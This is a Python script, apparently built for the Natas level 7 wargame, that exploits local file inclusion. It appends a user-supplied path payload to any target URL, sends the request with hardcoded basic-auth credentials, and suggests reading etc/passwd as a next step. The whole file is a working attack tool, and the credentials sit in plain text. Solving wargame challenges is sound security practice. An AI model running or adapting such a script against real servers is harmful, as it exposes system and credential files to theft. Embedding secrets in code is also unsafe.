#!/bin/python3

import argparse
import pyfiglet
import requests
import sys

script_name = pyfiglet.figlet_format('Natas7 LFI')
print(script_name)

parser = argparse.ArgumentParser(add_help=True, description = 'Attempts to exploit LFI on the target URL')
parser.add_argument('-v','--verbose', action='store', help='Verbose mode')
parser.add_argument('-u','--url', action='store', help='URL to target', required=True)
parser.add_argument('-p', '--payload', action='store', help='LFI payload e.g. var/www/etc/natas/natas7/index.php', required=True)
parser.add_argument('-c', '--cookies', action='store', help='For setting cookies if necessary e.g. {\'security\':\'low\', \'PHPSESSID\':\'<value>\'}')
args = parser.parse_args()

try:
	print('[*] Testing URL...')
	r = requests.get(f'{args.url}/{args.payload}', auth=('natas7', '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))
	print(r.text)

	decision = input('Is there anyway forward e.g. a hint on the page: y or n? ')
	if decision == 'y':
		data = input('What is the new payload? ')
		if data != '':
			fdata = data
			r = requests.get(f'{args.url}/{fdata}', auth=('natas7', '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))
			print(r.text)
			sys.exit(1)
		else:
			print('A new payload is needed e.g. etc/passwd')
			print(f'Exiting {sys.argv[0]}')
			sys.exit(1) 
	elif decision == 'n':
		print('Try again or try another exploit')
		print(f'Exiting {sys.argv[0]}')
		sys.exit(1) 
	else:
		print('Please select y or n')
		print(f'Exiting {sys.argv[0]}')
		sys.exit(1) 
		
except requests.exceptions.RequestException as er:
	print(f'Response returned: {er}')
	print(f'Exiting {sys.argv[0]}')
	sys.exit(1)
